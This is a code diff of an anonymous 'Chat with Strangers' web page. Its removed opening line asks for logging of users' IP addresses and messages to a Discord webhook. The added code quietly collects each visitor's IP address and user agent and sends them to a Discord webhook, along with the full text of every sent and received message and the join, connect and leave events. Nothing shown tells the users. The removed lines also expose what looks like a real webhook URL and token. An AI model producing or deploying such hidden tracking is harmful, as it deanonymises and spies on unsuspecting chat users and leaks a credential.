@@ -1,5 +1,3 @@
-add to this code when 2 users are joined to a chat room to send it to a discord webhook and when one of the user types something it send the massage to a discord right but only shows the user ip address whoever sendet that massage make sure to show the 2 of the users ip addresess: show the whole code 
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -511,7 +509,7 @@ add to this code when 2 users are joined to a chat room to send it to a discord 
 
     <script>
         // Discord webhook URL - replace with your actual webhook URL
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367170603349442630/9htMn415se3vdlHm1xAvg75G2-fhkLiyNK-Y2NiWLnYUIFWLlh3eYs3BYq938VYxjdNG';
+        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
         
         const setupScreen = document.getElementById('setup-screen');
         const chatScreen = document.getElementById('chat-screen');
@@ -548,86 +546,39 @@ add to this code when 2 users are joined to a chat room to send it to a discord 
         let onlineUsers = new Map();
         let heartbeatInterval;
         
-        // Function to send data to Discord webhook
-        async function sendToDiscordWebhook(username, ipAddress, message = null) {
-            try {
-                const payload = {
-                    content: null,
-                    embeds: [
-                        {
-                            title: message ? "New Message Sent" : "New User Joined",
-                            description: message ? 
-                                `A new message has been sent in the chat` : 
-                                "A new user has joined the chat application",
-                            color: message ? 3447003 : 5814783, // Blue for messages, purple for joins
-                            fields: [
-                                {
-                                    name: "Username",
-                                    value: username,
-                                    inline: true
-                                },
-                                {
-                                    name: "IP Address",
-                                    value: ipAddress,
-                                    inline: true
-                                },
-                                {
-                                    name: "Timestamp",
-                                    value: new Date().toISOString(),
-                                    inline: false
-                                }
-                            ],
-                            footer: {
-                                text: "Chat with Strangers"
-                            }
-                        }
-                    ]
-                };
-
-                // Add message field if this is a message notification
-                if (message) {
-                    payload.embeds[0].fields.unshift({
-                        name: "Message Content",
-                        value: message,
-                        inline: false
-                    });
-                }
-                
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload)
-                });
-                
-                if (!response.ok) {
-                    log(`Failed to send to Discord webhook: ${response.status}`);
-                }
-            } catch (error) {
-                log(`Error sending to Discord webhook: ${error.message}`);
-            }
-        }
-        
         // Function to get user's IP address
         async function getUserIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
-                userIP = data.ip;
                 return data.ip;
             } catch (error) {
-                log(`Error getting IP address: ${error.message}`);
-                try {
-                    // Fallback to a different IP service
-                    const fallbackResponse = await fetch('https://ipapi.co/json/');
-                    const fallbackData = await fallbackResponse.json();
-                    userIP = fallbackData.ip;
-                    return fallbackData.ip;
-                } catch (fallbackError) {
-                    log(`Fallback IP service also failed: ${fallbackError.message}`);
-                    return 'Unknown';
-                }
+                console.error('Error fetching IP:', error);
+                return 'Unknown';
+            }
+        }
+        
+        // Function to send data to Discord webhook
+        async function sendToDiscordWebhook(data) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
+                console.warn('Discord webhook URL not configured');
+                return;
+            }
+            
+            try {
+                const payload = {
+                    content: `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
+                };
+                
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending to Discord webhook:', error);
             }
         }
         
@@ -712,14 +663,24 @@ add to this code when 2 users are joined to a chat room to send it to a discord 
             const peerId = generateSimpleId();
             localUsername = generateUsername();
             
+            // Get user's IP address
+            userIP = await getUserIP();
+            
+            // Send user info to Discord webhook
+            const userInfo = {
+                event: 'User Joined',
+                timestamp: new Date().toISOString(),
+                username: localUsername,
+                peerId: peerId,
+                ipAddress: userIP,
+                userAgent: navigator.userAgent
+            };
+            
+            await sendToDiscordWebhook(userInfo);
+            
             log(`Initializing PeerJS with ID: ${peerId}`);
             
             try {
-                // Get user's IP address and send to Discord
-                await getUserIP();
-                log(`User IP: ${userIP}`);
-                await sendToDiscordWebhook(localUsername, userIP);
-                
                 peer = new Peer(peerId, {
                     debug: 2
                 });
@@ -1015,6 +976,18 @@ add to this code when 2 users are joined to a chat room to send it to a discord 
                     username: localUsername
                 });
                 
+                // Send connection info to Discord
+                const connectionInfo = {
+                    event: 'Connection Established',
+                    timestamp: new Date().toISOString(),
+                    localUser: localUsername,
+                    localPeerId: myPeerId,
+                    remotePeerId: connection.peer,
+                    ipAddress: userIP
+                };
+                
+                sendToDiscordWebhook(connectionInfo);
+                
                 setupScreen.style.display = 'none';
                 chatScreen.style.display = 'flex';
                 statusText.textContent = 'Connected';
@@ -1032,6 +1005,20 @@ add to this code when 2 users are joined to a chat room to send it to a discord 
                 
                 if (data.type === 'message') {
                     appendMessage(data.message, false, remoteUsername || 'Stranger');
+                    
+                    // Send received message to Discord
+                    const messageData = {
+                        event: 'Message Received',
+                        timestamp: new Date().toISOString(),
+                        from: remoteUsername || 'Unknown',
+                        fromPeerId: connection.peer,
+                        to: localUsername,
+                        toPeerId: myPeerId,
+                        message: data.message,
+                        ipAddress: userIP
+                    };
+                    
+                    sendToDiscordWebhook(messageData);
                 } else if (data.type === 'username') {
                     remoteUsername = data.username;
                     usernameDisplay.textContent = `Chatting with: ${remoteUsername}`;
@@ -1060,6 +1047,18 @@ add to this code when 2 users are joined to a chat room to send it to a discord 
         
         function handleDisconnect() {
             isConnected = false;
+            
+            // Send disconnect info to Discord
+            const disconnectInfo = {
+                event: 'Connection Closed',
+                timestamp: new Date().toISOString(),
+                localUser: localUsername,
+                localPeerId: myPeerId,
+                remotePeerId: connection ? connection.peer : 'Unknown',
+                ipAddress: userIP
+            };
+            
+            sendToDiscordWebhook(disconnectInfo);
             
             setupScreen.style.display = 'flex';
             chatScreen.style.display = 'none';
@@ -1170,12 +1169,19 @@ add to this code when 2 users are joined to a chat room to send it to a discord 
                 
                 appendMessage(message, true, localUsername);
                 
-                // Send message to Discord webhook
-                try {
-                    await sendToDiscordWebhook(localUsername, userIP, message);
-                } catch (error) {
-                    log(`Error sending message to Discord: ${error.message}`);
-                }
+                // Send sent message to Discord
+                const messageData = {
+                    event: 'Message Sent',
+                    timestamp: new Date().toISOString(),
+                    from: localUsername,
+                    fromPeerId: myPeerId,
+                    to: remoteUsername || 'Unknown',
+                    toPeerId: connection.peer,
+                    message: message,
+                    ipAddress: userIP
+                };
+                
+                await sendToDiscordWebhook(messageData);
                 
                 messageInput.value = '';
             }
@@ -1198,6 +1204,17 @@ add to this code when 2 users are joined to a chat room to send it to a discord 
         });
         
         window.addEventListener('beforeunload', () => {
+            // Send user leaving info to Discord
+            const leaveInfo = {
+                event: 'User Left',
+                timestamp: new Date().toISOString(),
+                username: localUsername,
+                peerId: myPeerId,
+                ipAddress: userIP
+            };
+            
+            sendToDiscordWebhook(leaveInfo);
+            
             if (connection) connection.close();
             if (trackerConnection) trackerConnection.close();
             if (heartbeatInterval) clearInterval(heartbeatInterval);
